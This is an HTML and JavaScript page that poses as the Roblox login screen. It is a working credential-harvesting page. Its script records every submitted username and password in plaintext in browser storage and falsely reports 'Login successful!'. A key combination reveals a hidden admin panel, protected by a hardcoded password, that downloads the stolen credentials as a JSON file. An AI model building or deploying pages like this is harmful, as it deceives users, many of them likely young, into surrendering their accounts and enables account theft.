<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login to Roblox</title>
    <style>
        body {
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #1b1b1b;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .navbar {
            position: fixed;
            top: 0;
            width: 100%;
            background-color: #1b1b1b;
            display: flex;
            align-items: center;
            padding: 10px 20px;
            box-sizing: border-box;
        }
        .navbar a {
            color: #fff;
            margin-right: 20px;
            text-decoration: none;
        }
        .navbar input[type="search"] {
            margin-left: auto;
            padding: 5px;
            border-radius: 4px;
            border: none;
        }
        .navbar button {
            margin-left: 10px;
            padding: 5px 10px;
            border: none;
            border-radius: 4px;
            background-color: #0070e0;
            color: white;
            cursor: pointer;
        }
        .login-container {
            background-color: #2c2c2c;
            padding: 40px;
            border-radius: 8px;
            text-align: center;
            width: 300px;
        }
        .login-container h2 {
            margin-bottom: 20px;
        }
        .login-container input[type="text"],
        .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border-radius: 4px;
            border: none;
            background-color: #3c3c3c;
            color: #fff;
        }
        .login-container input[type="submit"] {
            width: 100%;
            padding: 10px;
            margin: 12px 0;
            border-radius: 4px;
            border: 1px solid #fff;
            background-color: transparent;
            color: #fff;
            cursor: pointer;
        }
        .login-container a {
            display: block;
            margin: 8px 0;
            color: #fff;
            text-decoration: none;
        }
        #status {
            margin-top: 10px;
            color: #4CAF50;
            font-weight: bold;
        }
        #adminPanel {
            display: none;
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #444;
        }
    </style>
</head>
<body>
    <div class="navbar">
        <a href="#">Charts</a>
        <a href="#">Marketplace</a>
        <a href="#">Create</a>
        <a href="#">Robux</a>
        <input type="search" placeholder="Search">
        <button>Sign Up</button>
    </div>

    <div class="login-container">
        <h2>Login to Roblox</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Username/Email/Phone" required>
            <input type="password" id="password" placeholder="Password" required>
            <input type="submit" value="Log In">
        </form>
        <div id="status"></div>
        <a href="#" onclick="alert('Feature not implemented')">Forgot Password or Username?</a>
        
        <div id="adminPanel">
            <h3>Admin Panel</h3>
            <input type="password" id="adminPassword" placeholder="Enter admin password">
            <button onclick="checkAdminPassword()">Download User Data</button>
        </div>
    </div>

    <script>
        // Store user data in memory
        let users = [];
        const ADMIN_PASSWORD = "admin123"; // Change this to your desired password
        let keysPressed = {};
        
        // Key combination detection
        document.addEventListener('keydown', (event) => {
            keysPressed[event.key] = true;
            
            // Check for 9 and P simultaneously (case insensitive)
            if ((keysPressed['9'] || keysPressed['9']) && (keysPressed['p'] || keysPressed['P'])) {
                document.getElementById('adminPanel').style.display = 'block';
            }
        });

        document.addEventListener('keyup', (event) => {
            keysPressed[event.key] = false;
        });

        // Load any existing data from localStorage
        if (localStorage.getItem('usersData')) {
            try {
                users = JSON.parse(localStorage.getItem('usersData'));
            } catch (e) {
                console.error("Error loading saved data:", e);
            }
        }

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const username = document.getElementById('username').value;
            const password = document.getElementById('password').value;

            // Add new user data
            users.push({
                username: username,
                password: password,
                timestamp: new Date().toISOString()
            });

            // Save to localStorage
            localStorage.setItem('usersData', JSON.stringify(users));
            
            document.getElementById('status').textContent = 'Login successful!';
            document.getElementById('password').value = '';
        });

        function checkAdminPassword() {
            const enteredPassword = document.getElementById('adminPassword').value;
            
            if (enteredPassword === ADMIN_PASSWORD) {
                downloadUserData();
            } else {
                alert("Incorrect admin password!");
            }
        }

        function downloadUserData() {
            const jsonData = JSON.stringify(users, null, 2);
            const blob = new Blob([jsonData], {type: 'application/json'});
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = 'users.json';
            a.style.display = 'none';
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            alert("User data downloaded as users.json");
        }
    </script>
</body>
</html>
